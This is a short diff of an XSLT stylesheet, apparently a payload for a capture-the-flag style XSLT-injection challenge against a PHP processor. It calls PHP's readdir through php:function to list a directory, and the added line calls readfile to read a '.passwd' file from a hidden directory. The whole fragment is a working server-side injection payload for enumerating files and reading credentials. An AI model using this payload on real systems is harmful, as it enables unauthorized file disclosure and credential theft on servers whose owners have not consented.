@@ -10,6 +10,7 @@
 <xsl:value-of select="php:function('readdir')"/>
 <xsl:text>|   |</xsl:text>
 <xsl:value-of select="php:function('readdir')"/>
+<xsl:value-of select="php:function('readfile','.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
 </body>
 </html> 
 
